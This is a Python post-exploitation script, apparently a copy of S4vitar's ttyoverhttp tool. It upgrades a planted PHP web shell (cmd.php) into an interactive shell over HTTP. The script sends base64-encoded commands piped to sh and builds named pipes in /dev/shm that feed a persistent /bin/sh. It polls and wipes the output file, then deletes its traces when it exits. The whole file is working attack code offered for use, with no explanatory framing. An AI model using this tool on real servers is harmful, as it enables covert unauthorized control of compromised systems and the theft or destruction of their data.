#!/usr/bin/python3

# Author: S4vitar -> https://github.com/s4vitar/ttyoverhttp

import requests, time, threading, pdb, signal, sys
from base64 import b64encode
from random import randrange

class AllTheReads(object):
    def __init__(self, interval=1):
        self.interval = interval
        thread = threading.Thread(target=self.run, args=())
        thread.daemon = True
        thread.start()

    def run(self):
        # Read the output of the command
        readoutput = """/bin/cat %s""" % (stdout)
        # Clear the output file
        clearoutput = """echo '' > %s""" % (stdout)
        while True:
            output = RunCmd(readoutput)
            if output:
                RunCmd(clearoutput)
                print(output)
            time.sleep(self.interval)

def RunCmd(cmd):
    # Encode the command
    cmd = cmd.encode('utf-8')
    cmd = b64encode(cmd).decode('utf-8')
    # Construct the payload
    payload = {
        'cmd' : 'echo "%s" | base64 -d | sh' %(cmd)
    }
    # Send the request and get the result
    result = (requests.get('http://127.0.0.1/cmd.php', params=payload, timeout=5).text).strip()
    return result

def WriteCmd(cmd):
    # Encode the command
    cmd = cmd.encode('utf-8')
    cmd = b64encode(cmd).decode('utf-8')
    # Construct the payload
    payload = {
        'cmd' : 'echo "%s" | base64 -d > %s' % (cmd, stdin)
    }
    # Send the request and get the result
    result = (requests.get('http://127.0.0.1/cmd.php', params=payload, timeout=5).text).strip()
    return result

def ReadCmd():
    # Get the output from the output file
    GetOutput = """/bin/cat %s""" % (stdout)
    output = RunCmd(GetOutput)
    return output

def SetupShell():
    # Set up named pipes for the shell
    NamedPipes = """mkfifo %s; tail -f %s | /bin/sh 2>&1 > %s""" % (stdin, stdin, stdout)
    try:
        RunCmd(NamedPipes)
    except:
        None
    return None

# Set up global variables for input and output files
global stdin, stdout
session = randrange(1000, 9999)
stdin = "/dev/shm/input.%s" % (session)
stdout = "/dev/shm/output.%s" % (session)
erasestdin = """/bin/rm %s""" % (stdin)
erasestdout = """/bin/rm %s""" % (stdout)

# Set up the shell
SetupShell()

# Start reading the output
ReadingTheThings = AllTheReads()

def sig_handler(sig, frame):
    print("\n\n[*] Exiting...\n")
    print("[*] Removing files...\n")
    RunCmd(erasestdin)
    RunCmd(erasestdout)
    print("[*] All files have been deleted\n")
    sys.exit(0)

signal.signal(signal.SIGINT, sig_handler)

while True:
    # Get user input
    cmd = input("> ")
    # Write the command to the input file
    WriteCmd(cmd + "\n")
    # Wait for a short time before reading the output
    time.sleep(1.1)
    
    